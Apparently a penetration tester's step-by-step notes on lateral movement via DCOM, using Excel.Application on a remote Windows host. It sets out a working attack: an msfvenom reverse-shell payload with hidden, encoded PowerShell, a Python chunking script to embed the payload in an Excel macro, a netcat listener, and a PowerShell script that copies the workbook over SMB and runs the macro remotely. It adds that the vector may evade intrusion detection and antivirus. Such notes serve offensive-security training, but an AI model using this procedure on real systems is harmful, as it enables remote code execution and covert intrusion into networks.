
Distributed Component Object Model
----------------------------------

1. run powershell.exe

2. $com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192.168.1.110"))

3. $com | Get-Member

4. The output contains many methods and objects but we will focus on the Run method

5. create excel document

6. select View---> select Macros

7. kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=<ip_address_win_victim_1> LPORT=4444 -f hta-psh -o evil.hta
7a. cat evil.hta
7b. copy from -"powershell ...." to "....=="
7c. use python script to split the command in to smaller chuncks:

str = "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQ....."
n = 50
for i in range(0, len(str), n):
	print "Str = Str + " + '"' + str[i:i+n] + '"'

7d. python splitstring.py
7e. update the excel macro:
Sub mymacro()
"HERE GOES THE SPLITED CODE"
End Sub

7f. save as *.xls file

8. start netcat listener on the victim win num 1 machine:
--->in cmd:
nc.exe -lnvp 4444 

9. copy the excel doc to remote computer
---> in powershell:
notepad file.ps1
---> paste the script(with the proper modifications):
***
$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192.168.1.110"))
$LocalPath = "C:\Users\jeff_admin.corp\myexcel.xls"
$RemotePath = "\\192.168.1.110\c$\myexcel.xls"
[System.IO.File]::Copy($LocalPath, $RemotePath, $True)
$Path = "\\192.168.1.110\c$\Windows\sysWOW64\config\systemprofile\Desktop"
$temp = [system.io.directory]::createDirectory($Path)
$Workbook = $com.Workbooks.Open("C:\myexcel.xls")
$com.Run("mymacro")
***

note:
******
While the attack requires access to both TCP 135 for DCOM and TCP 445 for SMB, this is a relatively
new vector for lateral movement and may avoid some detection systems such as Network
Intrusion Detection or host-based antivir
======================================================================================
